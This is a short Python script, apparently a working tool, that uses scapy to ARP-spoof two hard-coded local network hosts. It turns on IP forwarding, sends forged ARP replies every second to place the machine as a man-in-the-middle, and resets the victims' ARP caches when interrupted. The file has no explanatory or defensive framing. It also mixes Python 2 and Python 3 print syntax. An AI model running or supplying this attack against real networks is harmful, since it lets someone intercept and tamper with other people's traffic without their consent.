import sys
import time
import os
import signal
from scapy.all import *
# No useless data on the screen
conf.verb = 0


def getMAC(ip):
    try:
        val = arping(ip)
        return val[0][0][1].src
    except:
        return 0


ip1 = "192.168.4.135"
ip2 = "192.168.4.151"
mac1 = getMAC(ip1)
mac2 = getMAC(ip2)
if(mac1 == 0):
    sys.exit(ip1+" is unreachable")
if(mac2 == 0):
    sys.exit(ip2+" is unreachable")


# print mac1, " ", mac2

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def signal_handler(signal, frame):
    print("Someone Pressed Ctrl+C")
    send(ARP(op=2, pdst=ip1, psrc=ip2,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac2), count=3)
    send(ARP(op=2, pdst=ip2, psrc=ip1,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac1), count=3)
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

while True:
    send(ARP(op=2, psrc=ip1, pdst=ip2, hwdst=mac2))
    send(ARP(op=2, psrc=ip2, pdst=ip1, hwdst=mac1))
    print "Spoofing ", ip1, " and ", ip2
    time.sleep(1)
